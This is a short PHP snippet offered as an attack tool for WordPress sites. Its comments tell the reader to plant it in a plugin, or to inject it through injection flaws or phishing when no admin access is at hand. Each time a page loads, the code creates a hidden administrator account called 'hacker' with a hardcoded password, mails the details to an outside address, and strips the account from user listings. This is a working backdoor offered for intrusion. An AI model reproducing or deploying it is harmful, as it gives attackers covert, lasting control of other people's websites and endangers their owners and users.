// Add the above code to the end of a plugin (or anywhere else in a plugin). And upload it to the WordPress website. 
//You can use injection methods, Pishing to inject this code if you don't have admin access


function create_hide_secret_admin_user() {
    $username = 'hacker'; // Change this to your secret username
    $password = 'hackxjr'; // Change this to your secret password
    $email = 'tharilakshan37@gmail.com'; // Change this to your email

    $user = get_user_by('login', $username);

    if (!$user) {
        // Create the secret admin user
        $user_id = wp_create_user($username, $password, $email);

        // Set the user role to Administrator
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        // Hide the secret admin user from the user list
        update_user_meta($user_id, 'show_admin_bar_front', false);
        update_user_meta($user_id, 'wp_capabilities', ['administrator' => true]);

        // Send an email to the new admin user
        $subject = 'Your Admin Account is Created';
        $message = 'Congratulations! Your admin account has been created on ' . get_bloginfo('name') . '.';
        wp_mail($email, $subject, $message);
    } else {
        // If the user exists, ensure it's hidden from the user list
        $user_id = $user->ID;
        update_user_meta($user_id, 'show_admin_bar_front', false);
        update_user_meta($user_id, 'wp_capabilities', ['administrator' => false]);
    }
}

function exclude_secret_admin_user($user_search) {
    $username = 'hacker'; // Change this to your secret username
    $user = get_user_by('login', $username);

    if ($user) {
        // Exclude the secret admin user from user queries
        global $wpdb;
        $user_search->query_where = str_replace(
            "WHERE 1=1",
            "WHERE 1=1 AND {$wpdb->users}.ID <> " . $user->ID,
            $user_search->query_where
        );
    }
}

// Hook the function to run once when you access any page in your site
add_action('init', 'create_hide_secret_admin_user');
add_action('pre_user_query', 'exclude_secret_admin_user');
